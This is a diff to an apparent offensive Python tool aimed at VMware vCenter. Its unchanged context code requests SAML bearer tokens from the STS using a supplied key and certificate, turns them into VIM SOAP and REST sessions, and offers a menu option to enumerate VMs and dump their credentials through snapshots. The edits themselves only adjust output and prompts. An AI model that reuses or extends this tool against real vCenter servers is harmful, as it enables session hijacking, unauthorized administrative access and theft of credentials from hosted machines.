@@ -617,7 +617,7 @@ def sts_issue_bearer_token(target: str, key_pem: str, cert_pem: str,
                 assertion = root.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}Assertion')
             if assertion is not None:
                 xml_str = etree.tostring(assertion, encoding='unicode')
-                print('[+] STS issued SAML bearer token (solution user auth)')
+                if verbose: print('[+] STS issued SAML bearer token')
                 return xml_str
 
             if verbose:
@@ -878,7 +878,7 @@ def loginbytoken_soap(target: str, saml_assertion_xml: str, verbose=False):
         if r.status_code == 200 and 'vmware_soap_session' in r.headers.get('Set-Cookie', ''):
             m = re.search(r'vmware_soap_session=([^;]+)', r.headers['Set-Cookie'])
             if m:
-                print('[+] VIM SOAP session established (solution user)')
+                if verbose: print('[+] VIM SOAP session established')
                 return 'vmware_soap_session', m.group(1)
         if verbose:
             print(f'[v] LoginByToken response: {r.text[:600]}')
@@ -1466,7 +1466,7 @@ class VCenterSession:
                     self._s.headers['vmware-api-session-id'] = tok
                     print('[+] REST API token obtained via admin password')
                     return tok
-        print('[!] REST API token exchange failed — check -vcenter-pass')
+        if self._verbose: print('[!] REST API token exchange failed — check -vcenter-pass')
         return None
 
     def get(self, path, **kw):
@@ -1700,19 +1700,20 @@ def _select_vms(vms: list) -> list:
     return selected
 
 
-def _select_snapshot_menu(entries: list) -> tuple:
+def _select_snapshot_menu(entries: list, vm_name: str = '') -> tuple:
     """Snapshot selection menu. Returns ('existing', entry_dict) or ('new', None)."""
     if not entries:
         return ('new', None)
 
-    print(f'\n[*] Existing snapshots on this VM ({len(entries)}):')
+    label = vm_name or 'this VM'
+    print(f'\n[*] Existing snapshots on {label} ({len(entries)}):')
     for i, e in enumerate(entries, 1):
         dt = e['create_time'].strftime('%Y-%m-%d %H:%M UTC') if e['create_time'] else 'unknown'
-        print(f'  [{i}] {e["name"]}  ({dt})  — {e["stem"]}')
+        print(f'  [{i}] {e["name"]}  ({dt})')
     print(f'  [N] Create new snapshot')
 
     try:
-        raw = input('\n[?] Select snapshot number or N to create new: ').strip()
+        raw = input('[?] Select snapshot (1/N): ').strip()
     except (EOFError, KeyboardInterrupt):
         return ('new', None)
 
@@ -1980,7 +1981,7 @@ def main():
         print(f'\n[+] vCenter: {target}')
         print('\n [1] Obtain admin session token')
         print(' [2] Enumerate VMs and dump credentials')
-        choice = input('→ ').strip()
+        choice = input('[?] Select action (1/2): ').strip()
         if choice not in ('1', '2'):
             return
 
@@ -2038,10 +2039,8 @@ def main():
             vm_id   = vm.get('vm', '')
             vm_name = vm.get('name', vm_id)
 
-            print(f'\n[*] {vm_name}')
-
             vmsd_snaps = _discover_existing_snapshots(vc, vm_name, verbose=args.verbose)
-            snap_choice, snap_entry = _select_snapshot_menu(vmsd_snaps)
+            snap_choice, snap_entry = _select_snapshot_menu(vmsd_snaps, vm_name)
 
             target_files = None
             if snap_choice == 'existing':
